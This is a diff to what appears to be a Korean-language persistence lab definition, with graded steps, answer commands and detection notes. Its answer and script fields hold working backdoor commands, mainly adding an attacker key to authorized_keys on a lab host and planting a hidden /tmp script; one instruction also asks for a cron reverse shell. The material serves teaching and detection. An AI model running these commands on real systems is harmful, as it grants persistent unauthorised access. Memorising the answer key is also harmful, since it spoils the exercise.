@@ -17,18 +17,16 @@ steps:
   hint: ssh-keygen으로 키를 생성하고 ssh-copy-id 또는 수동으로 공개키를 추가한다
   category: exploit
   points: 10
-  answer: 'ssh-keygen -t ed25519 -f /tmp/backdoor_key -N '''' -q && sshpass -p1 ssh -o StrictHostKeyChecking=no ccc@10.20.30.80 ''mkdir -p ~/.ssh && chmod 700 ~/.ssh'' 2>/dev/null && cat /tmp/backdoor_key.pub
-    | sshpass -p1 ssh ccc@10.20.30.80 ''cat >> ~/.ssh/authorized_keys && chmod 600 ~/.ssh/authorized_keys'' 2>/dev/null && ssh -i /tmp/backdoor_key -o StrictHostKeyChecking=no ccc@10.20.30.80 ''echo SSH
-    key backdoor successful: $(whoami)'' 2>/dev/null'
+  answer: 'ssh-keygen -t ed25519 -f /tmp/backdoor_key -N '''' -q && ssh ccc@10.20.30.80 ''mkdir -p ~/.ssh && chmod 700 ~/.ssh'' 2>/dev/null && cat /tmp/backdoor_key.pub | ssh ccc@10.20.30.80 ''cat >> ~/.ssh/authorized_keys
+    && chmod 600 ~/.ssh/authorized_keys'' 2>/dev/null && ssh -i /tmp/backdoor_key -o StrictHostKeyChecking=no ccc@10.20.30.80 ''echo SSH key backdoor successful: $(whoami)'' 2>/dev/null'
   answer_detail: SSH 키 기반 백도어는 가장 은밀한 지속성 기법 중 하나이다. authorized_keys에 공격자의 공개키를 추가하면 비밀번호 변경과 무관하게 접속이 가능하다. 탐지를 위해 authorized_keys를 정기적으로 감사해야 한다.
   verify:
     type: output_contains
     expect: backdoor successful
     field: stdout
   target_vm: attacker
-  script: 'ssh-keygen -t ed25519 -f /tmp/backdoor_key -N '''' -q && sshpass -p1 ssh -o StrictHostKeyChecking=no ccc@10.20.30.80 ''mkdir -p ~/.ssh && chmod 700 ~/.ssh'' 2>/dev/null && cat /tmp/backdoor_key.pub
-    | sshpass -p1 ssh ccc@10.20.30.80 ''cat >> ~/.ssh/authorized_keys && chmod 600 ~/.ssh/authorized_keys'' 2>/dev/null && ssh -i /tmp/backdoor_key -o StrictHostKeyChecking=no ccc@10.20.30.80 ''echo SSH
-    key backdoor successful: $(whoami)'' 2>/dev/null'
+  script: 'ssh-keygen -t ed25519 -f /tmp/backdoor_key -N '''' -q && ssh ccc@10.20.30.80 ''mkdir -p ~/.ssh && chmod 700 ~/.ssh'' 2>/dev/null && cat /tmp/backdoor_key.pub | ssh ccc@10.20.30.80 ''cat >> ~/.ssh/authorized_keys
+    && chmod 600 ~/.ssh/authorized_keys'' 2>/dev/null && ssh -i /tmp/backdoor_key -o StrictHostKeyChecking=no ccc@10.20.30.80 ''echo SSH key backdoor successful: $(whoami)'' 2>/dev/null'
   risk_level: medium
 - order: 2
   instruction: web 서버에 cron 기반 리버스 셸 백도어를 설정하라. 매 5분마다 공격자에게 연결을 시도하는 cronjob을 작성하라(실제 실행은 하지 않고 crontab 형식만 작성).
@@ -131,30 +129,30 @@ steps:
   hint: 점(.)으로 시작하는 디렉토리는 ls에 표시되지 않는다
   category: exploit
   points: 10
-  answer: sshpass -p1 ssh -o StrictHostKeyChecking=no ccc@10.20.30.80 'mkdir -p /tmp/.hidden_backdoor && echo "#!/bin/bash" > /tmp/.hidden_backdoor/update.sh && echo "# Simulated backdoor script" >> /tmp/.hidden_backdoor/update.sh
-    && chmod +x /tmp/.hidden_backdoor/update.sh && ls -la /tmp/.hidden_backdoor/' 2>/dev/null
+  answer: ssh ccc@10.20.30.80 'mkdir -p /tmp/.hidden_backdoor && echo "#!/bin/bash" > /tmp/.hidden_backdoor/update.sh && echo "# Simulated backdoor script" >> /tmp/.hidden_backdoor/update.sh && chmod +x
+    /tmp/.hidden_backdoor/update.sh && ls -la /tmp/.hidden_backdoor/' 2>/dev/null
   answer_detail: '숨겨진 디렉토리(.으로 시작)에 백도어를 배치하면 일반적인 ls 명령으로는 발견되지 않는다. /tmp, /dev/shm, /var/tmp 등 tmpfs 디렉토리가 자주 사용된다. 탐지: find로 숨겨진 파일/디렉토리를 정기 검색한다.'
   verify:
     type: output_contains
     expect: update.sh
     field: stdout
   target_vm: attacker
-  script: sshpass -p1 ssh -o StrictHostKeyChecking=no ccc@10.20.30.80 'mkdir -p /tmp/.hidden_backdoor && echo "#!/bin/bash" > /tmp/.hidden_backdoor/update.sh && echo "# Simulated backdoor script" >> /tmp/.hidden_backdoor/update.sh
-    && chmod +x /tmp/.hidden_backdoor/update.sh && ls -la /tmp/.hidden_backdoor/' 2>/dev/null
+  script: ssh ccc@10.20.30.80 'mkdir -p /tmp/.hidden_backdoor && echo "#!/bin/bash" > /tmp/.hidden_backdoor/update.sh && echo "# Simulated backdoor script" >> /tmp/.hidden_backdoor/update.sh && chmod +x
+    /tmp/.hidden_backdoor/update.sh && ls -la /tmp/.hidden_backdoor/' 2>/dev/null
   risk_level: medium
 - order: 6
   instruction: PAM(Pluggable Authentication Module) 백도어의 원리를 이해하기 위해 web 서버의 PAM 설정 파일을 확인하라.
   hint: /etc/pam.d/ 디렉토리의 설정 파일을 확인한다
   category: analysis
   points: 10
-  answer: sshpass -p1 ssh -o StrictHostKeyChecking=no ccc@10.20.30.80 'cat /etc/pam.d/sshd 2>/dev/null; echo ---; cat /etc/pam.d/common-auth 2>/dev/null' 2>/dev/null | head -30
+  answer: ssh ccc@10.20.30.80 'cat /etc/pam.d/sshd 2>/dev/null; echo ---; cat /etc/pam.d/common-auth 2>/dev/null' 2>/dev/null | head -30
   answer_detail: PAM 백도어는 인증 모듈을 조작하여 특정 비밀번호로 모든 계정에 로그인할 수 있게 한다. pam_unix.so를 수정하거나 커스텀 PAM 모듈을 삽입하는 방식이다. 매우 은밀하지만 패키지 무결성 검사(debsums)로 탐지할 수 있다.
   verify:
     type: output_contains
     expect: pam
     field: stdout
   target_vm: attacker
-  script: sshpass -p1 ssh -o StrictHostKeyChecking=no ccc@10.20.30.80 'cat /etc/pam.d/sshd 2>/dev/null; echo ---; cat /etc/pam.d/common-auth 2>/dev/null' 2>/dev/null | head -30
+  script: ssh ccc@10.20.30.80 'cat /etc/pam.d/sshd 2>/dev/null; echo ---; cat /etc/pam.d/common-auth 2>/dev/null' 2>/dev/null | head -30
   risk_level: low
 - order: 7
   instruction: LD_PRELOAD 백도어의 원리를 이해하기 위해, 간단한 공유 라이브러리를 작성하고 LD_PRELOAD로 함수를 후킹하는 예제를 만들어라.
@@ -245,16 +243,16 @@ steps:
   hint: /etc/ssh/sshd_config 파일을 확인한다
   category: analysis
   points: 10
-  answer: sshpass -p1 ssh -o StrictHostKeyChecking=no ccc@10.20.30.80 'grep -E "(PermitRootLogin|PasswordAuthentication|AuthorizedKeysFile|Port)" /etc/ssh/sshd_config' 2>/dev/null && echo '---' && echo
-    'Persistence via sshd_config:' && echo '1. PermitRootLogin yes -> root SSH 직접 접속' && echo '2. AuthorizedKeysFile 변경 -> 숨겨진 위치의 키 파일 사용' && echo '3. 추가 Port 열기 -> 비표준 포트로 SSH 접속'
+  answer: ssh ccc@10.20.30.80 'grep -E "(PermitRootLogin|PasswordAuthentication|AuthorizedKeysFile|Port)" /etc/ssh/sshd_config' 2>/dev/null && echo '---' && echo 'Persistence via sshd_config:' && echo '1.
+    PermitRootLogin yes -> root SSH 직접 접속' && echo '2. AuthorizedKeysFile 변경 -> 숨겨진 위치의 키 파일 사용' && echo '3. 추가 Port 열기 -> 비표준 포트로 SSH 접속'
   answer_detail: 'sshd_config를 조작하면 PermitRootLogin 활성화, 추가 포트 열기, 비표준 AuthorizedKeysFile 경로 설정 등으로 지속적 접근을 확보할 수 있다. 탐지: FIM으로 sshd_config 변경 감시.'
   verify:
     type: output_contains
     expect: '---'
     field: stdout
   target_vm: attacker
-  script: sshpass -p1 ssh -o StrictHostKeyChecking=no ccc@10.20.30.80 'grep -E "(PermitRootLogin|PasswordAuthentication|AuthorizedKeysFile|Port)" /etc/ssh/sshd_config' 2>/dev/null && echo '---' && echo
-    'Persistence via sshd_config:' && echo '1. PermitRootLogin yes -> root SSH 직접 접속' && echo '2. AuthorizedKeysFile 변경 -> 숨겨진 위치의 키 파일 사용' && echo '3. 추가 Port 열기 -> 비표준 포트로 SSH 접속'
+  script: ssh ccc@10.20.30.80 'grep -E "(PermitRootLogin|PasswordAuthentication|AuthorizedKeysFile|Port)" /etc/ssh/sshd_config' 2>/dev/null && echo '---' && echo 'Persistence via sshd_config:' && echo '1.
+    PermitRootLogin yes -> root SSH 직접 접속' && echo '2. AuthorizedKeysFile 변경 -> 숨겨진 위치의 키 파일 사용' && echo '3. 추가 Port 열기 -> 비표준 포트로 SSH 접속'
   risk_level: low
 - order: 13
   instruction: 기존 시스템 바이너리를 트로이목마로 교체하는 기법을 분석하라. ls 명령을 래핑하여 숨겨진 파일을 표시하지 않는 예제를 작성하라.
@@ -279,18 +277,16 @@ steps:
   hint: 각 지속성 벡터를 순차적으로 검사하는 스크립트를 작성한다
   category: analysis
   points: 15
-  answer: sshpass -p1 ssh -o StrictHostKeyChecking=no ccc@10.20.30.80 'echo "=== Persistence Hunt ==="; echo "[SSH Keys]"; wc -l ~/.ssh/authorized_keys 2>/dev/null; echo "[Cron]"; crontab -l 2>/dev/null
-    | wc -l; echo "[Systemd]"; ls /etc/systemd/system/*.service 2>/dev/null | wc -l; echo "[Hidden /tmp]"; find /tmp -name ".*" -type d 2>/dev/null; echo "[SUID]"; find / -perm -4000 -newer /etc/hostname
-    2>/dev/null | wc -l; echo "[at queue]"; atq 2>/dev/null' 2>/dev/null
+  answer: ssh ccc@10.20.30.80 'echo "=== Persistence Hunt ==="; echo "[SSH Keys]"; wc -l ~/.ssh/authorized_keys 2>/dev/null; echo "[Cron]"; crontab -l 2>/dev/null | wc -l; echo "[Systemd]"; ls /etc/systemd/system/*.service
+    2>/dev/null | wc -l; echo "[Hidden /tmp]"; find /tmp -name ".*" -type d 2>/dev/null; echo "[SUID]"; find / -perm -4000 -newer /etc/hostname 2>/dev/null | wc -l; echo "[at queue]"; atq 2>/dev/null' 2>/dev/null
   answer_detail: 지속성 헌팅은 침해 대응(IR)의 핵심 활동이다. 정기적인 지속성 검사로 백도어를 조기에 발견할 수 있다. 자동화된 도구(OSSEC, Wazuh FIM)와 수동 검사를 병행하는 것이 효과적이다.
   verify:
     type: output_contains
     expect: Persistence Hunt
     field: stdout
   target_vm: attacker
-  script: sshpass -p1 ssh -o StrictHostKeyChecking=no ccc@10.20.30.80 'echo "=== Persistence Hunt ==="; echo "[SSH Keys]"; wc -l ~/.ssh/authorized_keys 2>/dev/null; echo "[Cron]"; crontab -l 2>/dev/null
-    | wc -l; echo "[Systemd]"; ls /etc/systemd/system/*.service 2>/dev/null | wc -l; echo "[Hidden /tmp]"; find /tmp -name ".*" -type d 2>/dev/null; echo "[SUID]"; find / -perm -4000 -newer /etc/hostname
-    2>/dev/null | wc -l; echo "[at queue]"; atq 2>/dev/null' 2>/dev/null
+  script: ssh ccc@10.20.30.80 'echo "=== Persistence Hunt ==="; echo "[SSH Keys]"; wc -l ~/.ssh/authorized_keys 2>/dev/null; echo "[Cron]"; crontab -l 2>/dev/null | wc -l; echo "[Systemd]"; ls /etc/systemd/system/*.service
+    2>/dev/null | wc -l; echo "[Hidden /tmp]"; find /tmp -name ".*" -type d 2>/dev/null; echo "[SUID]"; find / -perm -4000 -newer /etc/hostname 2>/dev/null | wc -l; echo "[at queue]"; atq 2>/dev/null' 2>/dev/null
   risk_level: low
 - order: 15
   instruction: 지속성 확보 실습 결과를 /tmp/persistence_report.txt에 정리하라. 사용한 기법, MITRE ATT&CK ID, 탐지 방법을 포함하라.
